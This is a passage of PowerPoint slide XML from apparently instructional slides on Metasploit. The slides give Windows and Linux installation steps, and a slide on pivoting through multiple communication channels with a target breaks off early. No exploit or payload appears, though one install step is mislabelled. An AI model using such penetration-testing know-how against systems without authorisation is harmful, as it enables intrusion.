                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Download the latest Windows installer.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Run Installer:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t> Right-click installer, choose "Run as administrator."</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Accept License:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t> Read and accept the license agreement.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Select Components:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t> Choose installation components (default settings).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Choose Directory:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t> Specify installation directory (default is often C:\Metasploit).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Configure Web Server Port:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t> Set Metasploit web server port (default is 3790).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Configure Database Connection:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t> Use default database settings.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Start Metasploit: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Choose to start Metasploit after installation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Access Metasploit:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t> Open Metasploit console from the Start menu or run “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>” in the command prompt.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Update Metasploit:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t> Keep Metasploit updated with “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>msfupdate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>” command.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Google Shape;392;p45">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0F20DCAC-C39F-C8A6-0453-04E568789845}"/>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 Steps to Install Metasploit on Windows</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5916113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7BF38D7-DE3F-AEAF-B8FF-B3716CAC735F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Update System: Use command </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t> apt update”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Install Dependencies: Use command </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t> apt install git ruby”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Download</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Metasploit:Use</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>command</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>“git</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t> clone https://github.com/rapid7/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>metasploit-framework.git</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Navigate to Metasploit Directory: Use command </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>“cd </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>-framework”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Install Metasploit: Use command </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t> bash </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>“./</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Run Metasploit: Use command </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>“./</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Update Metasploit: Use command</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t> “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>msfupdate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Access Metasploit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Google Shape;403;p46">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2380DE68-7CEF-B68B-484C-3F5CC0C47183}"/>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 Steps to Install Metasploit on Linux</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19559972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23D8E-132A-C665-01A5-317ED1A705AC}"/>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Setting up multiple communication channels with the target</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F0DC87E1-85E3-56CA-43D2-2F1B3377204C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Setting up multiple communication channels (also known as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>pivot points</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>multi-channel transport</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
